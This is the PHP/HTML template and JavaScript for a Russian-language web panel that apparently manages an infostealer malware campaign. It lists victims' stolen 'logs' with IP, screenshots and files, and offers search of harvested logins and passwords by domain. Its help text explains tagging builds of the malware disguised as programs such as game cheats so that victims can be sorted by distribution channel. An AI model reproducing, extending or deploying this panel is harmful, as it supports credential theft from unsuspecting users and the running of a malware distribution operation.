<div class="row">
	<div class="col-12 grid-margin">
		<div class="card">
			<div class="card-body">
				<h4 class="card-title">Таблица <button class="btn btn-outline-secondary btn-circle btn-circle-sm" data-toggle="modal" data-target="#quest_modal_table"><i class="fas fa-question"></i></button></h4>

				<div class="table-responsive">
					<table class="table logs_table" id="table-logs">
						<thead>
							<tr>
								<th scope="col"></th>
								<th scope="col" class="text-center">
									<div class="custom-control custom-checkbox">
										<input type="checkbox" class="custom-control-input" id="CheckAll">
								  		<label class="custom-control-label" for="CheckAll"></label>
									</div>
								</th>
								<th scope="col">#</th>
								<th scope="col">Страна/IP</th>
								<th scope="col">Данные</th>
								<th scope="col">Дата</th>
								<th scope="col">Вес</th>
								<th scope="col">Скриншот</th>
								<th scope="col">Файл</th>
							</tr>
						</thead>
					</table>
				</div>
			</div>
		</div>
	</div>
</div>
<div class="row">
	<div class="col-12 grid-margin">
		<div class="card">
			<div class="card-body">
				<h4 class="card-title">Тэги <button class="btn btn-outline-secondary btn-circle btn-circle-sm" data-toggle="modal" data-target="#quest_modal_tags"><i class="fas fa-question"></i></button></h4>
				<p class="card-description">Здесь можно создать/удалить/изменить свои тэги. Не забудте попросить саппорта выдать вам билд на нужный тэг</p>
				
				<button class="btn btn-purple mb-2" data-toggle="modal" data-target="#add_new_tag">Добавить тэг</button>

				<div class="table-responsive">
					<table class="table" id="table-tags">
						<thead>
							<tr>
								<th>Название</th>
								<th>Ключ</th>
								<th>Дейстия</th>
							</tr>
						</thead>
					</table>
				</div>
			</div>
		</div>
	</div>
</div>
<div class="row">
	<div class="col-12 grid-margin">
		<div class="card">
			<div class="card-body">
				<h4 class="card-title">Найти в паролях</h4>
				<p class="card-description">Здесь вы можете найти пароли по запросу. Введите в поисковую строку домен, логин, или пароль на нажмите "найти". Все данные, найденные в базе будут представлены в таблице. Разделяйте запрос ";", чтобы вывести результат по нескольким доменам</p>

				<div class="row">
					<div class="col-12 col-md-10">
						<input type="text" id="find_text" placeholder="Например: vk.com" class="form-control">
					</div>
					<button class="btn btn-dark col-12 col-md-2" id="find_in_logs_btn" default>Найти</button>
				</div>

				<div class="row">
					<div class="table-responsive col-12 mt-2">
						<table class="table" id="pwd-table">
							<thead>
								<tr>
									<th>Домен</th>
									<th>Логин</th>
									<th>Пароль</th>
									<th>Браузер</th>
									<th>Информация</th>
								</tr>
							</thead>
						</table>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>


<div id="custom-table-select" class="d-flex">
	<label>
		Выбран тэг:
		<select id="tag_select" class="form-control float-right custom-select">
			<option value="0">Все логи</option>
			<?foreach($tags as $tag):?>
				<option value="<?=$tag->id?>"><?=$tag->name?></option>
			<?endforeach?>
		</select>
	</label>
</div>


<div class="modal fade" id="quest_modal_tags" tabindex="-1" role="dialog">
	<div class="modal-dialog modal-lg modal-dialog-centered" role="document">
		<div class="modal-content">
			<div class="modal-header">
				<h5 class="modal-title">Тэги</h5>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body">
				<p>Тэгирование - система удобного распределения логов по потокам вашего трафика. Предположим, что вы распространяете билд под видом нескольких программ. И чтобы понять, с какого именно трафика пришел лог, вы можете использовать систему тэгов. Вы просите саппорта создать 2 копии билда с 2-мя различными тэгами и распространяете их как обычно, но панель автоматически разделяет пришедшие логи в 2 группы. Так вам в разы удобнее работать с различными трафиками</p>
			</div>
			<div class="modal-footer">
				<button type="button" class="btn btn-secondary" data-dismiss="modal">Ок</button>
			</div>
		</div>
	</div>
</div>


<div class="modal fade" id="quest_modal_table" tabindex="-1" role="dialog">
	<div class="modal-dialog modal-lg modal-dialog-centered" role="document">
		<div class="modal-content">
			<div class="modal-header">
				<h5 class="modal-title">Таблица с логами</h5>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body">
				<p>Таблица - это основной инструмент работы с вашими логами. Здесь можно узнать подробную информацию по логу, скачать или удалить его. Также, чтобы вам было легче ориентироваться, вы можете отметить этот лог как просмотренный, просто кликнув по соответствующей кнопке. </p>
				<p>В колонке "Данные" указано большинство полезных данных лога. Наведите курсор на одну из иконок для получения текстового описания</p>
			</div>
			<div class="modal-footer">
				<button type="button" class="btn btn-secondary" data-dismiss="modal">Ок</button>
			</div>
		</div>
	</div>
</div>

<div class="modal fade" id="add_new_tag" tabindex="-1" role="dialog">
	<div class="modal-dialog" role="document">
		<div class="modal-content">
			<div class="modal-header">
				<h5 class="modal-title">Добавить тэг</h5>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body">
				<div class="form-group">
					<label for="create_tag_name">Название тэга</label>
					<input type="text" class="form-control" placeholder="Например: cs:go cheat..." id="create_tag_name">
				</div>
			</div>
			<div class="modal-footer">
				<button type="button" class="btn btn-purple" onclick="CreateTag();">Создать</button>
			</div>
		</div>
	</div>
</div>


<div class="modal fade" id="tagInfo" tabindex="-1" role="dialog">
	<div class="modal-dialog" role="document">
		<div class="modal-content">
			<div class="modal-header">
				<h5 class="modal-title">Изменить тэг</h5>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body">
				<div class="form-group">
					<label for="change_tag_name">Название тэга</label>
					<input type="text" class="form-control" placeholder="Например: cs:go cheat..." id="change_tag_name">
				</div>
			</div>
			<div class="modal-footer">
				<button type="button" class="btn btn-purple" onclick="ChangeTag();">Изменить</button>
			</div>
		</div>
	</div>
</div>

<script>
	o_name = "";
	var pwdTable;
	var tagsTable;
	var infoTable;
	var passwordsTable;

	function update_page_data() {
		table.ajax.reload(function() {
			$(".logs-screen").magnificPopup({type:"image"});
		});
	}

	
	function ChangeTagModal(name) {
		$("#change_tag_name").val(name);
		o_name = name;
		$("#tagInfo").modal('show');
	}
	function ChangeTag() {
		data = sendData("/logs/tags/change", {"o_name": o_name, "n_name": $("#change_tag_name").val()});
		if(data != false) {
			if(CheckData(data)) {
				tagsTable.ajax.reload();
			}
			$("#tagInfo").modal('hide');
		}
	}
	function CreateTag() {
		data = sendData("/logs/tags/create", {"name": $("#create_tag_name").val()});
		if(data != false) {
			if(CheckData(data)) {
				tagsTable.ajax.reload();
			}
			$("#add_new_tag").modal('hide');
		}
	}
	function DeleteTag(name) {
		swal.fire({
			icon: "warning",
			title: "Вы уверены?",
			text: "Если вы продолжите, то выбранный вами тэг будет удален. Все логи, находящиеся на этом тэге будут перемещены в основной тэг",
			showCancelButton: true,
	        confirmButtonText: 'Да, удалить',
	        cancelButtonText: 'Назад',
			customClass: {
				popup: 'swal-popup-class',
				title: 'swal-title-class',
			},
	    }).then((result) => {
	        if (result.value) {
	            data = sendData("/logs/tags/delete", {"name": name});
	            if(data != false) {
					if(CheckData(data)) {
						tagsTable.ajax.reload();
					}
				}
	        }
	    });
	} 

	$(document).ready(function() {
		pwdTable = $("#pwd-table").DataTable({
        	dom: 't<"d-sm-flex justify-content-between"lp>',
	        ajax: {
	            "url": "/logs/getTable/find_passwords",
	            "type": "POST",
	            "data": function ( d ) {
	                d.text = $("#find_text").val();
	            }
	        },
	        columns: [
	            { data: "url" },
	            { data: "login" },
	            { data: "password" },
	            { data: "browser" },
	            { 
	            	orderable: false,
	            	data: "id",
	            	render: function(data, type, row) {
	            		return '<a href="javascript:void(0)" class="btn btn-info infobtn mb-1" onclick="LoadLogData(' + data + ');"><i class="fas fa-info"></i></a>';
	            	},
	            },
	        ],
		});

		logs_tag = 0;
		TableLogsInit('<"d-sm-flex justify-content-between align-items-center"<"#logs_tag">f>t<"d-sm-flex justify-content-between"<"#logs_action">p>');

	    tagsTable = $("#table-tags").DataTable({
	    	dom: 't',
	    	ajax: {
				"url": "/logs/getTable/tags",
	            "type": "POST",
	    	},
	    	columns: [
	            { data: "name" },
	            { data: "key" },
	            { 
	            	data: "name",
	            	render: function(data, type, row) {
	            		return '<div class="btn-group"><button class="btn btn-danger" onclick="DeleteTag(\'' + data + '\');"><i class="fas fa-trash-alt"></i></button>' +
	            			'<button class="btn btn-info" onclick="ChangeTagModal(\'' + data + '\');"><i class="fas fa-info"></i></button></div>';
	            	},
	            },
	        ],
	    });


	    $("#custom-table-select").appendTo("#logs_tag");
	    $("#logs_action").html(get_instrument_to_log(0, 0, false, false, false));
	});

	$("#tag_select").change(function() {
	    logs_tag = this.value;
	    console.log(logs_tag);

	    table.ajax.reload();
	});

	$("#find_in_logs_btn").click(function(e) {
		e.preventDefault();

		if($("input#find_text").val() != undefined) {
			pwdTable.ajax.reload();
		}
	});

	$("input#find_text").keyup(function(event) {
	    if (event.keyCode === 13) {
	        $("#find_in_logs_btn").click();
	    }
	});

	$("#CheckAll").click(function() {
		$(".table-checkbox").each(function() {
			if($("#CheckAll").is(":checked")) {
				$(this).prop('checked', true);
			}
			else {
				$(this).prop('checked', false);
			}
		});
	});
</script>







